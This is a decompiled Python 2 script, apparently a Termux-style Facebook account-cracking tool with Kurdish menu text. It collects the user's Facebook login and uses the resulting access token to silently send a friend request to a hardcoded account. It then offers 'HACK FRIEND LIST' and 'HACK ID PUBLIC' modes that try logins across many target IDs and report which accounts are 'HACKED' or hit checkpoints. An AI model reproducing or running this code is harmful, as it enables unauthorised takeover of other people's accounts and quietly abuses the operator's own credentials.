...
# Embedded file name: /sdcard/encept/login.py
# Compiled at: 2021-04-12 16:16:28
...
def login():
    ...
    try:
        ...
        print fblogom
        id = raw_input('\x1b[1;91m[+] \x1b[0;34mEnter ID/Email \x1b[1;91m: \x1b[1;91m')
        pwd = raw_input('\x1b[1;91m[+] \x1b[0;34mEnter Password \x1b[1;91m: \x1b[1;91m')
        tik()
        try:
        ...
        if 'save-device' in url:
            try:
                ...
                unikers.close()
                print '\n\x1b[32;1m    [\xe2\x9c\x93] Login Ba Sarkawtwe\x1b[0m'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                time.sleep(2)
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[33;1m    [%]\xc2\xae XATAKAT XAWA BIGORA\x1b[0m'
                kelwa()
        ...
        if 'checkpoint' in url:
            ...
            print '\n\x1b[37;1m[{\xc3\x97}] Your \x1b[36;1mEmail\x1b[0m\x1b[37;1mOr Your \x1b[33;1mPassword\x1b[37;1mIS \x1b[31;1m Wrong /\x1b[0m'
            os.system('rm -rf login.txt')
            time.sleep(2)
            login()
...
def menu():
    ...
    xxj = '\n\x1b[32;1m\n\t.-~~~~-. \n       /   (o)(o)\n      /      .. |\n    /\\    \\____/\n    / \\   ,\\_/  \n     \\    /      \n\x1b[0m\n'
    print xxj
    print '\x1b[32;1m******************\x1b[37;1m[\x1b[33;1m\x1b[37;1m]\x1b[32;1m***********\x1b[0m'
    anime('[\xe2\x9c\x93] NAWI FACEBOKE  : ' + '[ ' + namefb + ' ]')
    anime('[\xe2\x9c\x93] ID : [ ' + id + ' ]')
    anime('[\xe2\x9c\x93] TOTAl FOLOW : ' + '[ ' + subid + ' ]')
    print ' '
    anime('\x1b[37;1m********************************************')
    print ' '
    opntn = '\n********************************************\n#\x1b[31;1m[ 1 ] START HACK \x1b[0m !\n#\x1b[32;1m[ 0 ] BO LOGOUT KRDNI ACAWNT \x1b[0m  !\n********************************************\n\t'
    print opntn
    time.sleep(1)
    option()
...
def option():
    unikers = raw_input('\n\x1b[33;1m [+] Select : \x1b[37;1m')
    if unikers == '':
        print '\x1b[31;1m [ \xcf\x80 ] SHTI GHAYR AWANA MANWSA'
        option()
    elif unikers == '1':
        graber()
    elif unikers == '0':
...
def graber():
    ...
    print '\x1b[34;1m[ 1 ] HACK FRIEND LIST\x1b[0m'
    print '\x1b[32;1m[ 2 ] HACK ID PUBLIC \x1b[0m'
    print '\x1b[37;1m[ 0 ] BUCK \x1b[0m'
    print '\x1b[37;1m>>>>>>>>>>>>>>>>>>>>>>>>>>>\x1b[0m'
    startgrab()
...
def startgrab():
    ...
    if peak == '':
        print '\x1b[31;1m [ \xcf\x80 ] BA JWANE HALEBZHERA'
        startgrab()
    else:
        if peak == '1':
            os.system('clear')
            ...
            os.system('clear')
            print logo
            idt = raw_input('\x1b[37;1m[ \xe2\x99\xa4 ] ID PASTE HERE : \x1b[0m')
            ...
            startgrab()
        print '\x1b[32;1m[ \xe2\x99\xa1 ] TOTAL IDS \x1b[34;1m' + str(len(id)) + '\x1b[0m'
        anime('\x1b[37;1m[ % ] Pleas WAIT........................')
        titik = ['.', '..', '...', '....', '.....', '......', '.......']
        for o in titik:
            print '\r\x1b[32;1m[ \xe2\x9c\x93 ] HACKING' + o,
            sys.stdout.flush()
            time.sleep(1)

    anime('\x1b[34;1mWAIT FOR CRACK.........')
    print '\x1b[37;1m=============================================='
    cekpoint = []
    oks = []
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[31;1mCP\xf0\x9f\x98\xba'
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[31;1mCP\xf0\x9f\x98\x9e'
                        print '\x1b[31;1mID : \x1b[37;1m' + user
                        ...
                        if 'access_token' in q:
                            ...
                            print '\x1b[31;1mCP\xf0\x9f\x98\x90'
                            print '\x1b[31;1mID : \x1b[37;1m' + user
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[32;1m HACKED\xf0\x9f\x91\xbb' + '\x1b[0m'
                                print '\x1b[32;1mID : \x1b[37;1m ' + user
    ...
    print ' '
    print '\x1b[32;1m[ \xe2\x9c\x93 ] Cracking Stop.!' + '\x1b[0m'
    print '\x1b[37;1mHACK \x1b[32;1mOKS/\x1b[31;1mCHECKPOINT\x1b[37;1m: \x1b[32;1m' + str(len(oks)) + '\x1b[37;1m/' + '\x1b[31;1m' + str(len(cekpoint))
    print ' '
    print ' '
    print logo
    raw_input('[ENTER]')
